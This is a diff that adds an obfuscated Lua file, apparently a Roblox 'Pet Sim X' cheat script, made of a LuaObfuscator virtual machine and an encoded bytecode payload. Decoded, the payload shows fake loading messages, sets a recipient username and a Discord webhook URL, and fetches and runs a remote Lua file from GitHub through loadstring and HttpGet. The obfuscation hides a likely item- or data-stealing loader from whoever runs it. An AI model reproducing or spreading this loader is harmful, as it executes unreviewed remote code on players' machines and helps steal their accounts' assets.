@@ -1,0 +1,642 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.co   (Alpha 0.2.6) ~  Much Love, Ferib 
+ 
+]]--
+ 
+do
+	local StrToNumber = tonumber;
+	local Byte = string.byte;
+	local Char = string.char;
+	local Sub = string.sub;
+	local Subg = string.gsub;
+	local Rep = string.rep;
+	local Concat = table.concat;
+	local Insert = table.insert;
+	local LDExp = math.ldexp;
+	local GetFEnv = getfenv or function()
+		return _ENV;
+	end;
+	local Setmetatable = setmetatable;
+	local PCall = pcall;
+	local Select = select;
+	local Unpack = unpack or table.unpack;
+	local ToNumber = tonumber;
+	local function VMCall(ByteString, vmenv, ...)
+		local FlatIdent_3382E = 0;
+		local DIP;
+		local repeatNext;
+		local gBit;
+		local gBits8;
+		local gBits16;
+		local gBits32;
+		local gFloat;
+		local gString;
+		local gInt;
+		local _R;
+		local Deserialize;
+		local Wrap;
+		while true do
+			if (3 == FlatIdent_3382E) then
+				function gFloat()
+					local FlatIdent_35969 = 0;
+					local Left;
+					local Right;
+					local IsNormal;
+					local Mantissa;
+					local Exponent;
+					local Sign;
+					while true do
+						if (FlatIdent_35969 == 0) then
+							Left = gBits32();
+							Right = gBits32();
+							FlatIdent_35969 = 1;
+						end
+						if (FlatIdent_35969 == 1) then
+							IsNormal = 1;
+							Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
+							FlatIdent_35969 = 2;
+						end
+						if (FlatIdent_35969 == 2) then
+							Exponent = gBit(Right, 21, 31);
+							Sign = ((gBit(Right, 32) == 1) and -1) or 1;
+							FlatIdent_35969 = 3;
+						end
+						if (FlatIdent_35969 == 3) then
+							if (Exponent == 0) then
+								if (Mantissa == 0) then
+									return Sign * 0;
+								else
+									local FlatIdent_4835A = 0;
+									while true do
+										if (0 == FlatIdent_4835A) then
+											Exponent = 1;
+											IsNormal = 0;
+											break;
+										end
+									end
+								end
+							elseif (Exponent == 2047) then
+								return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
+							end
+							return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
+						end
+					end
+				end
+				gString = nil;
+				function gString(Len)
+					local Str;
+					if not Len then
+						local FlatIdent_597FA = 0;
+						while true do
+							if (FlatIdent_597FA == 0) then
+								Len = gBits32();
+								if (Len == 0) then
+									return "";
+								end
+								break;
+							end
+						end
+					end
+					Str = Sub(ByteString, DIP, (DIP + Len) - 1);
+					DIP = DIP + Len;
+					local FStr = {};
+					for Idx = 1, #Str do
+						FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
+					end
+					return Concat(FStr);
+				end
+				gInt = gBits32;
+				FlatIdent_3382E = 4;
+			end
+			if (4 == FlatIdent_3382E) then
+				_R = nil;
+				function _R(...)
+					return {...}, Select("#", ...);
+				end
+				Deserialize = nil;
+				function Deserialize()
+					local FlatIdent_8DF78 = 0;
+					local Instrs;
+					local Functions;
+					local Lines;
+					local Chunk;
+					local ConstCount;
+					local Consts;
+					while true do
+						if (FlatIdent_8DF78 == 0) then
+							Instrs = {};
+							Functions = {};
+							Lines = {};
+							Chunk = {Instrs,Functions,nil,Lines};
+							FlatIdent_8DF78 = 1;
+						end
+						if (2 == FlatIdent_8DF78) then
+							for Idx = 1, gBits32() do
+								local Descriptor = gBits8();
+								if (gBit(Descriptor, 1, 1) == 0) then
+									local Type = gBit(Descriptor, 2, 3);
+									local Mask = gBit(Descriptor, 4, 6);
+									local Inst = {gBits16(),gBits16(),nil,nil};
+									if (Type == 0) then
+										local FlatIdent_8F32E = 0;
+										while true do
+											if (FlatIdent_8F32E == 0) then
+												Inst[3] = gBits16();
+												Inst[4] = gBits16();
+												break;
+											end
+										end
+									elseif (Type == 1) then
+										Inst[3] = gBits32();
+									elseif (Type == 2) then
+										Inst[3] = gBits32() - (2 ^ 16);
+									elseif (Type == 3) then
+										local FlatIdent_31B1C = 0;
+										while true do
+											if (0 == FlatIdent_31B1C) then
+												Inst[3] = gBits32() - (2 ^ 16);
+												Inst[4] = gBits16();
+												break;
+											end
+										end
+									end
+									if (gBit(Mask, 1, 1) == 1) then
+										Inst[2] = Consts[Inst[2]];
+									end
+									if (gBit(Mask, 2, 2) == 1) then
+										Inst[3] = Consts[Inst[3]];
+									end
+									if (gBit(Mask, 3, 3) == 1) then
+										Inst[4] = Consts[Inst[4]];
+									end
+									Instrs[Idx] = Inst;
+								end
+							end
+							for Idx = 1, gBits32() do
+								Functions[Idx - 1] = Deserialize();
+							end
+							for Idx = 1, gBits32() do
+								Lines[Idx] = gBits32();
+							end
+							return Chunk;
+						end
+						if (FlatIdent_8DF78 == 1) then
+							ConstCount = gBits32();
+							Consts = {};
+							for Idx = 1, ConstCount do
+								local FlatIdent_83CC7 = 0;
+								local Type;
+								local Cons;
+								while true do
+									if (FlatIdent_83CC7 == 0) then
+										Type = gBits8();
+										Cons = nil;
+										FlatIdent_83CC7 = 1;
+									end
+									if (1 == FlatIdent_83CC7) then
+										if (Type == 1) then
+											Cons = gBits8() ~= 0;
+										elseif (Type == 2) then
+											Cons = gFloat();
+										elseif (Type == 3) then
+											Cons = gString();
+										end
+										Consts[Idx] = Cons;
+										break;
+									end
+								end
+							end
+							Chunk[3] = gBits8();
+							FlatIdent_8DF78 = 2;
+						end
+					end
+				end
+				FlatIdent_3382E = 5;
+			end
+			if (FlatIdent_3382E == 0) then
+				DIP = 1;
+				repeatNext = nil;
+				ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
+					if (Byte(byte, 2) == 79) then
+						local FlatIdent_6A5CC = 0;
+						while true do
+							if (FlatIdent_6A5CC == 0) then
+								repeatNext = StrToNumber(Sub(byte, 1, 1));
+								return "";
+							end
+						end
+					else
+						local a = Char(StrToNumber(byte, 16));
+						if repeatNext then
+							local FlatIdent_81BB4 = 0;
+							local b;
+							while true do
+								if (FlatIdent_81BB4 == 1) then
+									return b;
+								end
+								if (FlatIdent_81BB4 == 0) then
+									b = Rep(a, repeatNext);
+									repeatNext = nil;
+									FlatIdent_81BB4 = 1;
+								end
+							end
+						else
+							return a;
+						end
+					end
+				end);
+				gBit = nil;
+				FlatIdent_3382E = 1;
+			end
+			if (FlatIdent_3382E == 5) then
+				Wrap = nil;
+				function Wrap(Chunk, Upvalues, Env)
+					local FlatIdent_5DFC9 = 0;
+					local Instr;
+					local Proto;
+					local Params;
+					while true do
+						if (FlatIdent_5DFC9 == 0) then
+							Instr = Chunk[1];
+							Proto = Chunk[2];
+							FlatIdent_5DFC9 = 1;
+						end
+						if (FlatIdent_5DFC9 == 1) then
+							Params = Chunk[3];
+							return function(...)
+								local VIP = 1;
+								local Top = -1;
+								local Args = {...};
+								local PCount = Select("#", ...) - 1;
+								local function Loop()
+									local Instr = Instr;
+									local Proto = Proto;
+									local Params = Params;
+									local _R = _R;
+									local Vararg = {};
+									local Lupvals = {};
+									local Stk = {};
+									for Idx = 0, PCount do
+										if ((2923 == 2923) and (Idx >= Params)) then
+											Vararg[Idx - Params] = Args[Idx + 1];
+										else
+											Stk[Idx] = Args[Idx + 1];
+										end
+									end
+									local Varargsz = (PCount - Params) + 1;
+									local Inst;
+									local Enum;
+									while true do
+										local FlatIdent_50492 = 0;
+										local FlatIdent_41F51;
+										local FlatIdent_4C524;
+										while true do
+											if ((2994 > 329) and (FlatIdent_50492 == 0)) then
+												FlatIdent_41F51 = 0;
+												FlatIdent_4C524 = nil;
+												FlatIdent_50492 = 1;
+											end
+											if ((FlatIdent_50492 == 1) or (3276 < 943)) then
+												while true do
+													if ((1960 < 4736) and (0 == FlatIdent_41F51)) then
+														FlatIdent_4C524 = 0;
+														while true do
+															if ((4436 >= 1461) and (FlatIdent_4C524 == 0)) then
+																local FlatIdent_9DD2 = 0;
+																local FlatIdent_15C3D;
+																while true do
+																	if ((2592 > 1814) and (FlatIdent_9DD2 == 0)) then
+																		FlatIdent_15C3D = 0;
+																		while true do
+																			if ((350 < 371) and (0 == FlatIdent_15C3D)) then
+																				Inst = Instr[VIP];
+																				Enum = Inst[1];
+																				FlatIdent_15C3D = 1;
+																			end
+																			if ((2609 >= 2577) and (FlatIdent_15C3D == 1)) then
+																				FlatIdent_4C524 = 1;
+																				break;
+																			end
+																		end
+																		break;
+																	end
+																end
+															end
+															if ((1310 == 1310) and (FlatIdent_4C524 == 1)) then
+																if ((1701 <= 3657) and (Enum <= 6)) then
+																	if ((1476 <= 4725) and (Enum <= 2)) then
+																		if ((Enum <= 0) or (1760 >= 2716)) then
+																			local FlatIdent_9557B = 0;
+																			local FlatIdent_602C4;
+																			local A;
+																			local B;
+																			while true do
+																				if ((FlatIdent_9557B == 1) or (1592 > 2007)) then
+																					B = nil;
+																					while true do
+																						if ((FlatIdent_602C4 == 0) or (4355 < 1315)) then
+																							local FlatIdent_8F631 = 0;
+																							while true do
+																								if ((FlatIdent_8F631 == 0) or (3468 >= 4634)) then
+																									local FlatIdent_24388 = 0;
+																									while true do
+																										if ((FlatIdent_24388 == 1) or (4135 < 2141)) then
+																											FlatIdent_8F631 = 1;
+																											break;
+																										end
+																										if ((FlatIdent_24388 == 0) or (917 <= 281)) then
+																											A = Inst[2];
+																											B = Stk[Inst[3]];
+																											FlatIdent_24388 = 1;
+																										end
+																									end
+																								end
+																								if ((1963 < 3989) and (FlatIdent_8F631 == 1)) then
+																									FlatIdent_602C4 = 1;
+																									break;
+																								end
+																							end
+																						end
+																						if ((1 == FlatIdent_602C4) or (1043 > 2437)) then
+																							Stk[A + 1] = B;
+																							Stk[A] = B[Inst[4]];
+																							break;
+																						end
+																					end
+																					break;
+																				end
+																				if ((FlatIdent_9557B == 0) or (4244 < 4004)) then
+																					local FlatIdent_69741 = 0;
+																					while true do
+																						if ((FlatIdent_69741 == 0) or (1478 == 2870)) then
+																							FlatIdent_602C4 = 0;
+																							A = nil;
+																							FlatIdent_69741 = 1;
+																						end
+																						if ((3358 >= 1104) and (FlatIdent_69741 == 1)) then
+																							FlatIdent_9557B = 1;
+																							break;
+																						end
+																					end
+																				end
+																			end
+																		elseif ((Enum > 1) or (3115 >= 3216)) then
+																			Stk[Inst[2]] = Inst[3] ~= 0;
+																		else
+																			Stk[Inst[2]] = Env[Inst[3]];
+																		end
+																	elseif ((Enum <= 4) or (4822 < 3138)) then
+																		if ((Enum == 3) or (2100 < 1691)) then
+																			Stk[Inst[2]]();
+																		else
+																			VIP = Inst[3];
+																		end
+																	elseif ((Enum == 5) or (3253 < 577)) then
+																		if ((2807 <= 4205) and (Stk[Inst[2]] == Inst[4])) then
+																			VIP = VIP + 1;
+																		else
+																			VIP = Inst[3];
+																		end
+																	else
+																		for Idx = Inst[2], Inst[3] do
+																			Stk[Idx] = nil;
+																		end
+																	end
+																elseif ((Enum <= 9) or (4906 < 4078)) then
+																	if ((Enum <= 7) or (2349 <= 1983)) then
+																		do
+																			return;
+																		end
+																	elseif ((Enum > 8) or (3998 >= 4835)) then
+																		if ((2380 < 4891) and (Inst[2] == Stk[Inst[4]])) then
+																			VIP = VIP + 1;
+																		else
+																			VIP = Inst[3];
+																		end
+																	else
+																		local FlatIdent_24F26 = 0;
+																		local FlatIdent_252FE;
+																		local FlatIdent_8DE20;
+																		local A;
+																		local Results;
+																		local Limit;
+																		local Edx;
+																		while true do
+																			if ((FlatIdent_24F26 == 0) or (2724 <= 1647)) then
+																				FlatIdent_252FE = 0;
+																				FlatIdent_8DE20 = nil;
+																				FlatIdent_24F26 = 1;
+																			end
+																			if ((FlatIdent_24F26 == 1) or (3407 <= 770)) then
+																				A = nil;
+																				Results = nil;
+																				FlatIdent_24F26 = 2;
+																			end
+																			if ((FlatIdent_24F26 == 2) or (4023 > 4897)) then
+																				Limit = nil;
+																				Edx = nil;
+																				FlatIdent_24F26 = 3;
+																			end
+																			if ((3 == FlatIdent_24F26) or (2755 < 1419)) then
+																				while true do
+																					if ((FlatIdent_252FE == 2) or (446 >= 1145)) then
+																						Edx = nil;
+																						while true do
+																							if ((FlatIdent_8DE20 == 0) or (586 == 2554)) then
+																								local FlatIdent_56474 = 0;
+																								while true do
+																									if ((2803 >= 2008) and (FlatIdent_56474 == 0)) then
+																										A = Inst[2];
+																										Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
+																										FlatIdent_56474 = 1;
+																									end
+																									if ((1681 < 3709) and (FlatIdent_56474 == 1)) then
+																										FlatIdent_8DE20 = 1;
+																										break;
+																									end
+																								end
+																							end
+																							if ((FlatIdent_8DE20 == 2) or (3356 <= 670)) then
+																								for Idx = A, Top do
+																									local FlatIdent_5145D = 0;
+																									while true do
+																										if ((FlatIdent_5145D == 0) or (1909 < 880)) then
+																											Edx = Edx + 1;
+																											Stk[Idx] = Results[Edx];
+																											break;
+																										end
+																									end
+																								end
+																								break;
+																							end
+																							if ((2568 >= 2370) and (FlatIdent_8DE20 == 1)) then
+																								local FlatIdent_B879 = 0;
+																								while true do
+																									if ((2143 >= 1425) and (FlatIdent_B879 == 0)) then
+																										local FlatIdent_1A7B6 = 0;
+																										while true do
+																											if ((0 == FlatIdent_1A7B6) or (4229 < 3581)) then
+																												Top = (Limit + A) - 1;
+																												Edx = 0;
+																												FlatIdent_1A7B6 = 1;
+																											end
+																											if ((2993 <= 3406) and (FlatIdent_1A7B6 == 1)) then
+																												FlatIdent_B879 = 1;
+																												break;
+																											end
+																										end
+																									end
+																									if ((FlatIdent_B879 == 1) or (2608 > 4603)) then
+																										FlatIdent_8DE20 = 2;
+																										break;
+																									end
+																								end
+																							end
+																						end
+																						break;
+																					end
+																					if ((1 == FlatIdent_252FE) or (420 > 4140)) then
+																						Results = nil;
+																						Limit = nil;
+																						FlatIdent_252FE = 2;
+																					end
+																					if ((2988 >= 1866) and (FlatIdent_252FE == 0)) then
+																						FlatIdent_8DE20 = 0;
+																						A = nil;
+																						FlatIdent_252FE = 1;
+																					end
+																				end
+																				break;
+																			end
+																		end
+																	end
+																elseif ((2117 == 2117) and (Enum <= 11)) then
+																	if ((Enum == 10) or (2677 < 1125)) then
+																		Stk[Inst[2]] = Inst[3];
+																	else
+																		Env[Inst[3]] = Stk[Inst[2]];
+																	end
+																elseif ((Enum == 12) or (1873 < 502)) then
+																	local FlatIdent_25719 = 0;
+																	local FlatIdent_3300C;
+																	local A;
+																	while true do
+																		if ((528 < 1931) and (FlatIdent_25719 == 0)) then
+																			FlatIdent_3300C = 0;
+																			A = nil;
+																			FlatIdent_25719 = 1;
+																		end
+																		if ((1006 >= 168) and (FlatIdent_25719 == 1)) then
+																			while true do
+																				if ((1370 <= 2030) and (FlatIdent_3300C == 0)) then
+																					A = Inst[2];
+																					Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
+																					break;
+																				end
+																			end
+																			break;
+																		end
+																	end
+																else
+																	Stk[Inst[2]][Inst[3]] = Inst[4];
+																end
+																VIP = VIP + 1;
+																break;
+															end
+														end
+														break;
+													end
+												end
+												break;
+											end
+										end
+									end
+								end
+								A, B = _R(PCall(Loop));
+								if not A[1] then
+									local line = Chunk[4][VIP] or "?";
+									error("Script error at [" .. line .. "]:" .. A[2]);
+								else
+									return Unpack(A, 2, B);
+								end
+							end;
+						end
+					end
+				end
+				return Wrap(Deserialize(), {}, vmenv)(...);
+			end
+			if (FlatIdent_3382E == 2) then
+				function gBits16()
+					local FlatIdent_253ED = 0;
+					local a;
+					local b;
+					while true do
+						if (FlatIdent_253ED == 0) then
+							a, b = Byte(ByteString, DIP, DIP + 2);
+							DIP = DIP + 2;
+							FlatIdent_253ED = 1;
+						end
+						if (FlatIdent_253ED == 1) then
+							return (b * 256) + a;
+						end
+					end
+				end
+				gBits32 = nil;
+				function gBits32()
+					local FlatIdent_68697 = 0;
+					local a;
+					local b;
+					local c;
+					local d;
+					while true do
+						if (FlatIdent_68697 == 1) then
+							return (d * 16777216) + (c * 65536) + (b * 256) + a;
+						end
+						if (FlatIdent_68697 == 0) then
+							a, b, c, d = Byte(ByteString, DIP, DIP + 3);
+							DIP = DIP + 4;
+							FlatIdent_68697 = 1;
+						end
+					end
+				end
+				gFloat = nil;
+				FlatIdent_3382E = 3;
+			end
+			if (FlatIdent_3382E == 1) then
+				function gBit(Bit, Start, End)
+					if End then
+						local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
+						return Res - (Res % 1);
+					else
+						local Plc = 2 ^ (Start - 1);
+						return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
+					end
+				end
+				gBits8 = nil;
+				function gBits8()
+					local FlatIdent_2AD0F = 0;
+					local a;
+					while true do
+						if (FlatIdent_2AD0F == 1) then
+							return a;
+						end
+						if (FlatIdent_2AD0F == 0) then
+							a = Byte(ByteString, DIP, DIP);
+							DIP = DIP + 1;
+							FlatIdent_2AD0F = 1;
+						end
+					end
+				end
+				gBits16 = nil;
+				FlatIdent_3382E = 2;
+			end
+		end
+	end
+	VMCall("LOL!193O00028O00026O000840026O00F03F026O00104003023O005F4703053O00546578743303133O00436865636B696E6720536372697074733O2E03053O00546578743403123O005374617274696E67205363726970743O2E027O004003053O00546578743103103O00536372697074204C6F616465643O2E03053O00546578743203153O0057616974696E6720666F72205363726970743O2E030D3O006C6F6164696E677363722O656E03103O00437573746F6D5363726970744E616D6503103O005065742053696D20782053637269707403083O00557365726E616D6503093O00666174676F6174323903073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130393731372O39302O3436383037343537392F694B536C6E36304134385A4156374D677A473755466C625668697863746B2D74513073614F6D77766B6C7A38397368664F635A6C53484932563976586E49312D4B44396E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C7561004F3O00120A3O00014O0006000100013O0026053O000200010001002O043O0002000100120A000100013O000E090002001400010001002O043O0014000100120A000200013O0026050002000C00010003002O043O000C000100120A000100043O002O043O001400010026050002000800010001002O043O00080001001201000300053O00300D000300060007001201000300053O00300D00030008000900120A000200033O002O043O00080001002605000100230001000A002O043O0023000100120A000200013O000E090001001E00010002002O043O001E0001001201000300053O00300D0003000B000C001201000300053O00300D0003000D000E00120A000200033O0026050002001700010003002O043O0017000100120A000100023O002O043O00230001002O043O001700010026050001003200010003002O043O0032000100120A000200013O0026050002002A00010003002O043O002A000100120A0001000A3O002O043O003200010026050002002600010001002O043O002600012O0002000300013O00120B0003000F3O001201000300053O00300D00030010001100120A000200033O002O043O002600010026050001004100010001002O043O0041000100120A000200013O0026050002003900010003002O043O0039000100120A000100033O002O043O004100010026050002003500010001002O043O0035000100120A000300133O00120B000300123O00120A000300153O00120B000300143O00120A000200033O002O043O003500010026050001000500010004002O043O00050001001201000200163O001201000300173O00202O00030003001800120A000500194O0008000300054O000C00023O00022O0003000200010001002O043O004E0001002O043O00050001002O043O004E0001002O043O000200012O00073O00017O004F3O00023O00033O00053O00053O00063O00083O00083O00093O000B3O000B3O000C3O000D3O000F3O000F3O00103O00103O00113O00113O00123O00133O00163O00163O00173O00193O00193O001A3O001A3O001B3O001B3O001C3O001E3O001E3O001F3O00203O00213O00243O00243O00253O00273O00273O00283O00293O002B3O002B3O002C3O002C3O002D3O002D3O002E3O002F3O00323O00323O00333O00353O00353O00363O00373O00393O00393O003A3O003A3O003B3O003B3O003C3O003D3O00403O00403O00413O00413O00413O00413O00413O00413O00413O00423O00433O00453O00463O00483O00", GetFEnv(), ...);
+end
